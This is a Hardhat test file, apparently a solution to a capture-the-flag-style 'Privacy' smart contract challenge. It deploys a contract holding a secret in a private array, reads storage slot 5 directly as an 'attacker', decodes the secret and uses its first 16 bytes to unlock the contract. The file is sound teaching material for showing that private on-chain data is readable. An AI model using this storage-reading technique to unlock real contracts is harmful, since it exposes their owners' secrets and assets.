import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { ethers } from "hardhat";
import { BigNumber, utils } from "ethers";

describe("Privacy", function () {

  // We define a fixture to reuse the same setup in every test.
  // We use loadFixture to run this setup once, snapshot that state,
  // and reset Hardhat Network to that snapshot in every test.
  async function deployFixture() {

    // Contracts are deployed using the first signer/account by default
    const [victim, attacker] = await ethers.getSigners();

    const secret = "secret"
    const element0Bytes = ethers.utils.formatBytes32String("element0")
    const element1Bytes = ethers.utils.formatBytes32String("element0")
    const element2Bytes = ethers.utils.formatBytes32String(secret)

    const Privacy = await ethers.getContractFactory("Privacy");
    const privacy = await Privacy.connect(victim).deploy([element0Bytes, element1Bytes, element2Bytes]);

    return { privacy, victim, attacker, secret };
  }


  it("Attacker should be able to read the private variable value", async function () {
    const { privacy, attacker, secret } = await loadFixture(deployFixture);

    const attackerVault = privacy.connect(attacker)
    //get storage slot for secret - the bytes32[3] starts at slot 3 and the secret is the last element, so 5
    const data = await ethers.provider.getStorageAt(privacy.address, 5)
    const secretString = ethers.utils.parseBytes32String(data)
    expect(secretString).to.equal(secret)
    expect(await privacy.locked()).to.be.equal(true)
    
    const secret16 = data.slice(0, 34)
    await privacy.unlock(secret16)
    expect(await privacy.locked()).to.be.equal(false)
  });

});
